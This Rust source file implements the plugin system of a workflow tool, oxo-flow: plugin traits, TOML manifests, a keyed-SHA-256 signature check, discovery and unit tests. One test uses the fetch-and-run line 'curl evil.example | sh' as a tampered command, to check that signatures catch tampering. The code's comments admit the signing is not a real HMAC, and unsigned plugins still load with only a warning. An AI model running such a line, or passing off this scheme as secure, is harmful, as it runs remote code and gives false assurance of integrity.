//! Plugin system for oxo-flow.
//!
//! Provides a compile-time + config-based plugin architecture. Plugins are
//! registered via TOML configuration files and ship as Rust crates compiled
//! into the binary — no unsafe dynamic loading required.
//!
//! ## Plugin Discovery
//!
//! Plugins are discovered from:
//! - `~/.oxo-flow/plugins/*.plugin.toml` (user-level)
//! - `<project>/.oxo-flow/plugins/*.plugin.toml` (project-level)
//!
//! ## Signature Verification
//!
//! Each plugin config must include an HMAC-SHA256 signature in its `[signature]`
//! section. The signature is verified against a trusted key to ensure plugin
//! authenticity and integrity.
//!
//! ## TOML Integration (parsed, not executed)
//!
//! Workflows may declare a `[plugins]` section:
//! ```toml
//! [plugins]
//! rules = ["r-function"]
//! executor = "slurm-custom"
//! ```
//! This version **parses** the section for forward compatibility but runs
//! nothing from it: no rule type, executor, or report renderer is dispatched
//! to a plugin. Deserializing a workflow that carries the section warns once
//! per process ([`INERT_PLUGINS_WARNING`]) — a plugin runtime is future
//! work, not a silent no-op.

use crate::error::{OxoFlowError, Result};
use crate::rule::Rule;
use serde::{Deserialize, Serialize};
use sha2::Sha256;
use std::collections::HashMap;
use std::path::{Path, PathBuf};

/// Version of the plugin API. Incremented on breaking changes.
pub const PLUGIN_API_VERSION: u32 = 1;

// ---------------------------------------------------------------------------
// Plugin Traits (implement these in your crate)
// ---------------------------------------------------------------------------

/// Trait for custom rule types (e.g., R functions, Python scripts).
pub trait RulePlugin: Send + Sync {
    fn rule_type(&self) -> &str;
    fn build_command(&self, rule: &Rule, values: &HashMap<String, String>) -> Result<String>;
    fn validate(&self, rule: &Rule) -> Result<()>;
    fn extra_fields(&self) -> Vec<(&str, &str)> {
        Vec::new()
    }
}

/// Trait for custom executors.
pub trait ExecutorPlugin: Send + Sync {
    fn backend_name(&self) -> &str;
    fn submit(
        &self,
        rule: &Rule,
        workdir: &Path,
    ) -> Result<crate::executor::checkpoint::BenchmarkRecord>;
    fn status(&self, job_id: &str) -> Result<crate::executor::JobStatus>;
    fn cancel(&self, job_id: &str) -> Result<()>;
}

/// Trait for custom report renderers.
pub trait ReportPlugin: Send + Sync {
    fn renderer_name(&self) -> &str;
    fn output_format(&self) -> &str;
    fn render(&self, report: &crate::report::Report) -> Result<Vec<u8>>;
}

// ---------------------------------------------------------------------------
// Plugin Configuration (TOML)
// ---------------------------------------------------------------------------

/// A plugin manifest loaded from a `.plugin.toml` file.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PluginManifest {
    /// Plugin name (unique identifier).
    pub name: String,
    /// Plugin version.
    pub version: String,
    /// Plugin type: "rule", "executor", "report".
    pub plugin_type: String,
    /// Human-readable description.
    pub description: Option<String>,
    /// Author information.
    pub author: Option<String>,
    /// Entry point / command template for rule plugins.
    pub command_template: Option<String>,
    /// Required environment (conda YAML path, docker image, etc.).
    pub environment: Option<String>,
    /// HMAC signature for authenticity verification.
    pub signature: Option<PluginSignature>,
}

/// HMAC-SHA256 signature for plugin verification.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PluginSignature {
    /// Key identifier (which trusted key to verify against).
    pub key_id: String,
    /// Hex-encoded HMAC-SHA256 signature of the plugin manifest content.
    pub value: String,
}

impl PluginManifest {
    /// Compute the signing payload: every manifest field except the
    /// signature, in a length-prefixed encoding (`<len>:<value>`).
    ///
    /// The old `name:version:type:description` join was ambiguous — a
    /// description containing `:` could impersonate a following field — and
    /// it omitted `author`, `command_template`, and `environment`, so a
    /// tampered command template (the field a rule plugin would execute)
    /// kept a valid signature.
    pub fn signing_payload(&self) -> String {
        let fields = [
            self.name.as_str(),
            self.version.as_str(),
            self.plugin_type.as_str(),
            self.description.as_deref().unwrap_or(""),
            self.author.as_deref().unwrap_or(""),
            self.command_template.as_deref().unwrap_or(""),
            self.environment.as_deref().unwrap_or(""),
        ];
        let mut payload = String::new();
        for field in fields {
            payload.push_str(&format!("{}:", field.len()));
            payload.push_str(field);
        }
        payload
    }

    /// Verify the HMAC-SHA256 signature against a trusted key.
    pub fn verify_signature(&self, trusted_keys: &HashMap<String, String>) -> Result<bool> {
        let sig = self
            .signature
            .as_ref()
            .ok_or_else(|| OxoFlowError::Config {
                message: format!("plugin '{}' has no signature", self.name),
            })?;

        let key = trusted_keys
            .get(&sig.key_id)
            .ok_or_else(|| OxoFlowError::Config {
                message: format!("unknown key_id '{}' for plugin '{}'", sig.key_id, self.name),
            })?;

        let payload = self.signing_payload();
        let expected = compute_keyed_sha256(key, &payload);

        Ok(expected == sig.value)
    }
}

/// Compute a keyed SHA-256 hex digest: SHA256(key || message).
///
/// NOTE: This is NOT a true HMAC (RFC 2104). It uses simple concatenation
/// instead of the ipad/opad construction. It provides integrity checking
/// against accidental corruption but NOT cryptographic authentication.
/// For production deployments, use a proper HMAC implementation.
fn compute_keyed_sha256(key: &str, message: &str) -> String {
    use sha2::Digest;
    let mut hasher = Sha256::new();
    hasher.update(key.as_bytes());
    hasher.update(message.as_bytes());
    format!("{:x}", hasher.finalize())
}

// ---------------------------------------------------------------------------
// Plugin Discovery
// ---------------------------------------------------------------------------

/// Discover plugin manifests from standard directories.
pub fn discover_plugins(project_dir: Option<&Path>) -> Vec<PluginManifest> {
    let mut manifests = Vec::new();

    // User-level plugins
    if let Some(home) = dirs_next() {
        let user_dir = home.join(".oxo-flow").join("plugins");
        manifests.extend(scan_plugin_dir(&user_dir));
    }

    // Project-level plugins
    if let Some(proj) = project_dir {
        let proj_dir = proj.join(".oxo-flow").join("plugins");
        manifests.extend(scan_plugin_dir(&proj_dir));
    }

    manifests
}

/// Scan a directory for `.plugin.toml` files and parse them.
fn scan_plugin_dir(dir: &Path) -> Vec<PluginManifest> {
    let mut manifests = Vec::new();
    let Ok(entries) = std::fs::read_dir(dir) else {
        return manifests;
    };

    for entry in entries.flatten() {
        let path = entry.path();
        if path.extension().is_some_and(|e| e == "toml")
            && path
                .file_stem()
                .is_some_and(|s| s.to_string_lossy().ends_with(".plugin"))
            && let Ok(content) = std::fs::read_to_string(&path)
            && let Ok(manifest) = toml::from_str::<PluginManifest>(&content)
        {
            manifests.push(manifest);
        }
    }

    manifests
}

/// Simple home directory helper.
fn dirs_next() -> Option<PathBuf> {
    std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
        .ok()
        .map(PathBuf::from)
}

// ---------------------------------------------------------------------------
// Plugin Registry
// ---------------------------------------------------------------------------

/// Registry of loaded and verified plugins.
#[derive(Default)]
pub struct PluginRegistry {
    /// Rule-type plugins indexed by rule_type.
    pub rule_plugins: HashMap<String, Box<dyn RulePlugin>>,
    /// Executor plugins indexed by backend_name.
    pub executor_plugins: HashMap<String, Box<dyn ExecutorPlugin>>,
    /// Report plugins indexed by renderer_name.
    pub report_plugins: HashMap<String, Box<dyn ReportPlugin>>,
    /// Verified plugin manifests.
    pub manifests: Vec<PluginManifest>,
    /// Trusted keys for signature verification.
    pub trusted_keys: HashMap<String, String>,
}

impl PluginRegistry {
    /// Register a rule plugin.
    pub fn register_rule(&mut self, plugin: Box<dyn RulePlugin>) {
        self.rule_plugins
            .insert(plugin.rule_type().to_string(), plugin);
    }

    /// Register an executor plugin.
    pub fn register_executor(&mut self, plugin: Box<dyn ExecutorPlugin>) {
        self.executor_plugins
            .insert(plugin.backend_name().to_string(), plugin);
    }

    /// Register a report plugin.
    pub fn register_report(&mut self, plugin: Box<dyn ReportPlugin>) {
        self.report_plugins
            .insert(plugin.renderer_name().to_string(), plugin);
    }

    /// Discover plugins from the filesystem and verify their signatures.
    pub fn discover(&mut self, project_dir: Option<&Path>) -> Result<usize> {
        let manifests = discover_plugins(project_dir);
        let mut loaded = 0;

        for manifest in manifests {
            // Verify signature if present and trusted keys are configured
            if manifest.signature.is_some() {
                if self.trusted_keys.is_empty() {
                    tracing::warn!(
                        plugin = %manifest.name,
                        "plugin has a signature but no trusted keys are configured — \
                         signature verification skipped. Configure trusted_keys_file in [plugins]."
                    );
                } else if !manifest.verify_signature(&self.trusted_keys)? {
                    tracing::warn!(
                        plugin = %manifest.name,
                        "plugin signature verification failed — skipping"
                    );
                    continue;
                }
            } else {
                tracing::warn!(
                    plugin = %manifest.name,
                    "plugin has no signature — loaded without integrity verification"
                );
            }

            self.manifests.push(manifest);
            loaded += 1;
        }

        Ok(loaded)
    }

    /// Find a rule plugin by type name.
    pub fn find_rule(&self, rule_type: &str) -> Option<&dyn RulePlugin> {
        self.rule_plugins.get(rule_type).map(|p| p.as_ref())
    }

    /// Find an executor plugin by backend name.
    pub fn find_executor(&self, backend: &str) -> Option<&dyn ExecutorPlugin> {
        self.executor_plugins.get(backend).map(|p| p.as_ref())
    }

    /// Find a report plugin by renderer name.
    pub fn find_report(&self, renderer: &str) -> Option<&dyn ReportPlugin> {
        self.report_plugins.get(renderer).map(|p| p.as_ref())
    }
}

// ---------------------------------------------------------------------------
// TOML Integration: [plugins] section in .oxoflow files
// ---------------------------------------------------------------------------

/// Warning emitted once per process when a workflow declares a `[plugins]`
/// section: this version parses the section but executes nothing from it.
pub const INERT_PLUGINS_WARNING: &str = "workflow [plugins] section is parsed but not executed by this version — \
     rule/executor/report plugin declarations are inert";

/// Whether [`INERT_PLUGINS_WARNING`] has already been emitted.
static INERT_PLUGINS_WARNED: std::sync::atomic::AtomicBool =
    std::sync::atomic::AtomicBool::new(false);

/// Emit [`INERT_PLUGINS_WARNING`] at most once per process. Returns `true`
/// when this call emitted it — the test seam for the once semantics.
fn warn_inert_plugins_once() -> bool {
    use std::sync::atomic::Ordering;
    if INERT_PLUGINS_WARNED.swap(true, Ordering::Relaxed) {
        return false;
    }
    tracing::warn!("{INERT_PLUGINS_WARNING}");
    true
}

/// Plugin configuration parsed from the `[plugins]` section in a workflow
/// file.
///
/// This version **parses** the section but executes nothing from it: no rule
/// type is dispatched to a [`RulePlugin`], no executor is replaced by an
/// [`ExecutorPlugin`], no renderer is swapped in for a [`ReportPlugin`]. The
/// registry API in this module is compile-time only. Deserialization warns
/// once per process ([`INERT_PLUGINS_WARNING`]) so a workflow author does
/// not believe the declared plugins are running.
#[derive(Debug, Clone, Default, Serialize)]
pub struct PluginsConfig {
    /// Rule plugin types to enable.
    #[serde(default)]
    pub rules: Vec<String>,
    /// Executor plugin to use.
    #[serde(default)]
    pub executor: Option<String>,
    /// Report plugins to enable.
    #[serde(default)]
    pub reports: Vec<String>,
    /// Path to a trusted keys file for signature verification.
    #[serde(default)]
    pub trusted_keys_file: Option<String>,
}

impl<'de> Deserialize<'de> for PluginsConfig {
    fn deserialize<D>(deserializer: D) -> std::result::Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        /// Mirror of the public struct so the derive stays mechanical.
        #[derive(Default, Deserialize)]
        #[serde(default)]
        struct Raw {
            rules: Vec<String>,
            executor: Option<String>,
            reports: Vec<String>,
            trusted_keys_file: Option<String>,
        }
        let raw = Raw::deserialize(deserializer)?;
        warn_inert_plugins_once();
        Ok(Self {
            rules: raw.rules,
            executor: raw.executor,
            reports: raw.reports,
            trusted_keys_file: raw.trusted_keys_file,
        })
    }
}

// ---------------------------------------------------------------------------
// Subprocess Plugin Executor (dynamic loading without unsafe code)
// ---------------------------------------------------------------------------

/// Output received from a plugin subprocess via stdout (JSON).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PluginOutput {
    /// Whether execution succeeded.
    pub success: bool,
    /// Modified or final shell command (if plugin transforms the command).
    pub command: Option<String>,
    /// Validation errors (if any).
    pub errors: Vec<String>,
    /// Log messages.
    pub logs: Vec<String>,
    /// Exit code suggestion (0 = success).
    pub exit_code: i32,
}

impl Default for PluginOutput {
    fn default() -> Self {
        Self {
            success: true,
            command: None,
            errors: Vec::new(),
            logs: Vec::new(),
            exit_code: 0,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    struct StubRulePlugin;
    impl RulePlugin for StubRulePlugin {
        fn rule_type(&self) -> &str {
            "stub"
        }
        fn build_command(&self, _rule: &Rule, _values: &HashMap<String, String>) -> Result<String> {
            Ok("echo stub".into())
        }
        fn validate(&self, _rule: &Rule) -> Result<()> {
            Ok(())
        }
    }

    #[test]
    fn registry_register_and_find() {
        let mut registry = PluginRegistry::default();
        registry.register_rule(Box::new(StubRulePlugin));
        assert!(registry.find_rule("stub").is_some());
        assert!(registry.find_rule("nonexistent").is_none());
    }

    #[test]
    fn plugin_api_version_is_stable() {
        assert_eq!(PLUGIN_API_VERSION, 1);
    }

    #[test]
    fn signing_payload_is_deterministic() {
        let manifest = PluginManifest {
            name: "test".into(),
            version: "1.0".into(),
            plugin_type: "rule".into(),
            description: Some("A test plugin".into()),
            author: None,
            command_template: None,
            environment: None,
            signature: None,
        };
        let payload1 = manifest.signing_payload();
        let payload2 = manifest.signing_payload();
        assert_eq!(payload1, payload2);
        assert!(payload1.contains("test"));
        assert!(payload1.contains("1.0"));
    }

    #[test]
    fn signature_verification_works() {
        let key = "test-secret-key-32bytes-minimum!";
        let manifest = PluginManifest {
            name: "verified-plugin".into(),
            version: "1.0".into(),
            plugin_type: "rule".into(),
            description: None,
            author: None,
            command_template: None,
            environment: None,
            signature: None,
        };

        let payload = manifest.signing_payload();
        let sig_value = compute_keyed_sha256(key, &payload);

        let mut manifest_signed = manifest.clone();
        manifest_signed.signature = Some(PluginSignature {
            key_id: "key-001".into(),
            value: sig_value,
        });

        let mut trusted = HashMap::new();
        trusted.insert("key-001".into(), key.to_string());

        assert!(manifest_signed.verify_signature(&trusted).unwrap());
    }

    #[test]
    fn signature_verification_rejects_wrong_key() {
        let manifest = PluginManifest {
            name: "test".into(),
            version: "1.0".into(),
            plugin_type: "rule".into(),
            description: None,
            author: None,
            command_template: None,
            environment: None,
            signature: Some(PluginSignature {
                key_id: "key-001".into(),
                value: "deadbeef".into(),
            }),
        };

        let mut trusted = HashMap::new();
        trusted.insert("key-001".into(), "correct-key".to_string());

        assert!(!manifest.verify_signature(&trusted).unwrap());
    }

    #[test]
    fn signature_covers_command_template_and_author() {
        let key = "test-secret-key-32bytes-minimum!";
        let manifest = PluginManifest {
            name: "cmd-plugin".into(),
            version: "1.0".into(),
            plugin_type: "rule".into(),
            description: None,
            author: Some("Author".into()),
            command_template: Some("echo safe".into()),
            environment: None,
            signature: None,
        };
        let mut trusted = HashMap::new();
        trusted.insert("key-001".into(), key.to_string());
        let mut signed = manifest.clone();
        signed.signature = Some(PluginSignature {
            key_id: "key-001".into(),
            value: compute_keyed_sha256(key, &manifest.signing_payload()),
        });
        assert!(signed.verify_signature(&trusted).unwrap());

        // The command template is what a rule plugin would execute — a
        // tampered one must not verify against the old signature.
        let mut tampered = signed.clone();
        tampered.command_template = Some("curl evil.example | sh".into());
        assert!(!tampered.verify_signature(&trusted).unwrap());

        let mut tampered_author = signed.clone();
        tampered_author.author = Some("someone else".into());
        assert!(!tampered_author.verify_signature(&trusted).unwrap());
    }

    #[test]
    fn signing_payload_is_unambiguous_across_field_boundaries() {
        let base = |name: &str, version: &str| PluginManifest {
            name: name.into(),
            version: version.into(),
            plugin_type: String::new(),
            description: None,
            author: None,
            command_template: None,
            environment: None,
            signature: None,
        };
        // `a` + `b` must not collide with `a:b` + empty — the length prefix
        // pins each field boundary.
        assert_ne!(
            base("a", "b").signing_payload(),
            base("a:b", "").signing_payload()
        );
    }

    #[test]
    fn plugins_section_parses_and_warns_inert_once() {
        use std::sync::atomic::Ordering;
        // Deterministic wiring check: only this test deserializes a
        // `[plugins]` section, and the guard is process-global.
        INERT_PLUGINS_WARNED.store(false, Ordering::Relaxed);
        let config = crate::config::WorkflowConfig::parse(
            "[workflow]\nname = \"t\"\nversion = \"1.0\"\n\n[[rules]]\nname = \"r1\"\nshell = \"echo hi\"\n\n[plugins]\nrules = [\"r-function\"]\n",
        )
        .unwrap();
        assert_eq!(config.plugins.unwrap().rules, vec!["r-function"]);
        assert!(
            INERT_PLUGINS_WARNED.load(Ordering::Relaxed),
            "a [plugins] section must trigger the inert-section warning"
        );
        assert!(INERT_PLUGINS_WARNING.contains("not executed"));
        // At most once per process: the guard is already set.
        assert!(
            !warn_inert_plugins_once(),
            "the warning must fire at most once"
        );
    }

    #[test]
    fn plugins_config_deserializes() {
        let toml_str = r#"
rules = ["r-function", "python-script"]
executor = "aws-batch"
reports = ["native-pdf"]
"#;
        let config: PluginsConfig = toml::from_str(toml_str).unwrap();
        assert_eq!(config.rules, vec!["r-function", "python-script"]);
        assert_eq!(config.executor.as_deref(), Some("aws-batch"));
        assert_eq!(config.reports, vec!["native-pdf"]);
    }

    // ── ExecutorPlugin trait ────────────────────────────────────────────

    struct StubExecutorPlugin;
    impl ExecutorPlugin for StubExecutorPlugin {
        fn backend_name(&self) -> &str {
            "stub-exec"
        }
        fn submit(
            &self,
            _rule: &Rule,
            _workdir: &Path,
        ) -> std::result::Result<crate::executor::checkpoint::BenchmarkRecord, OxoFlowError>
        {
            Err(OxoFlowError::Config {
                message: "stub".into(),
            })
        }
        fn status(
            &self,
            _job_id: &str,
        ) -> std::result::Result<crate::executor::JobStatus, OxoFlowError> {
            Err(OxoFlowError::Config {
                message: "stub".into(),
            })
        }
        fn cancel(&self, _job_id: &str) -> std::result::Result<(), OxoFlowError> {
            Err(OxoFlowError::Config {
                message: "stub".into(),
            })
        }
    }

    #[test]
    fn executor_plugin_register_and_find() {
        let mut registry = PluginRegistry::default();
        registry.register_executor(Box::new(StubExecutorPlugin));
        assert!(registry.find_executor("stub-exec").is_some());
        assert!(registry.find_executor("missing").is_none());
    }

    // ── ReportPlugin trait ──────────────────────────────────────────────

    struct StubReportPlugin;
    impl ReportPlugin for StubReportPlugin {
        fn renderer_name(&self) -> &str {
            "stub-report"
        }
        fn output_format(&self) -> &str {
            "txt"
        }
        fn render(
            &self,
            _report: &crate::report::Report,
        ) -> std::result::Result<Vec<u8>, OxoFlowError> {
            Ok(b"report".to_vec())
        }
    }

    #[test]
    fn report_plugin_register_and_find() {
        let mut registry = PluginRegistry::default();
        registry.register_report(Box::new(StubReportPlugin));
        assert!(registry.find_report("stub-report").is_some());
        assert!(registry.find_report("missing").is_none());
    }

    // ── PluginManifest deserialization ──────────────────────────────────

    #[test]
    fn manifest_minimal_toml() {
        let toml_str = r#"
name = "minimal"
version = "1.0"
plugin_type = "rule"
"#;
        let manifest: PluginManifest = toml::from_str(toml_str).unwrap();
        assert_eq!(manifest.name, "minimal");
        assert_eq!(manifest.plugin_type, "rule");
        assert!(manifest.description.is_none());
        assert!(manifest.signature.is_none());
    }

    #[test]
    fn manifest_with_all_fields() {
        let toml_str = r#"
name = "full"
version = "2.0"
plugin_type = "executor"
description = "A full plugin"
author = "Test Author"
command_template = "/usr/bin/full-plugin"
environment = "conda: env.yaml"

[signature]
key_id = "kp1"
value = "abc123def"
"#;
        let manifest: PluginManifest = toml::from_str(toml_str).unwrap();
        assert_eq!(manifest.name, "full");
        assert_eq!(manifest.plugin_type, "executor");
        assert_eq!(manifest.description.as_deref(), Some("A full plugin"));
        let sig = manifest.signature.unwrap();
        assert_eq!(sig.key_id, "kp1");
        assert_eq!(sig.value, "abc123def");
    }

    // ── Signature edge cases ────────────────────────────────────────────

    #[test]
    fn verify_signature_missing_signature_returns_error() {
        let manifest = PluginManifest {
            name: "test".into(),
            version: "1".into(),
            plugin_type: "rule".into(),
            description: None,
            author: None,
            command_template: None,
            environment: None,
            signature: None,
        };
        let trusted = std::collections::HashMap::new();
        let result = manifest.verify_signature(&trusted);
        assert!(result.is_err());
    }

    #[test]
    fn verify_signature_unknown_key_id_returns_error() {
        let manifest = PluginManifest {
            name: "test".into(),
            version: "1".into(),
            plugin_type: "rule".into(),
            description: None,
            author: None,
            command_template: None,
            environment: None,
            signature: Some(PluginSignature {
                key_id: "unknown".into(),
                value: "deadbeef".into(),
            }),
        };
        let mut trusted = std::collections::HashMap::new();
        trusted.insert("key-001".into(), "secret".into());
        assert!(manifest.verify_signature(&trusted).is_err());
    }

    #[test]
    fn verify_signature_tampered_payload() {
        let key = "my-key";
        let mut manifest = PluginManifest {
            name: "original".into(),
            version: "1.0".into(),
            plugin_type: "rule".into(),
            description: None,
            author: None,
            command_template: None,
            environment: None,
            signature: None,
        };
        let payload = manifest.signing_payload();
        let sig_value = compute_keyed_sha256(key, &payload);

        manifest.signature = Some(PluginSignature {
            key_id: "k1".into(),
            value: sig_value,
        });

        // Tamper with the name
        manifest.name = "tampered".into();

        let mut trusted = std::collections::HashMap::new();
        trusted.insert("k1".into(), key.to_string());
        let result = manifest.verify_signature(&trusted).unwrap();
        assert!(!result, "tampered payload should not verify");
    }

    // ── PluginsConfig ───────────────────────────────────────────────────

    #[test]
    fn plugins_config_executor_only() {
        let toml_str = r#"
executor = "custom-exec"
"#;
        let config: PluginsConfig = toml::from_str(toml_str).unwrap();
        assert!(config.rules.is_empty());
        assert_eq!(config.executor.as_deref(), Some("custom-exec"));
        assert!(config.reports.is_empty());
    }

    #[test]
    fn plugins_config_empty() {
        let config: PluginsConfig = toml::from_str("").expect("empty TOML must parse");
        assert!(config.rules.is_empty());
        assert!(config.executor.is_none());
    }
}
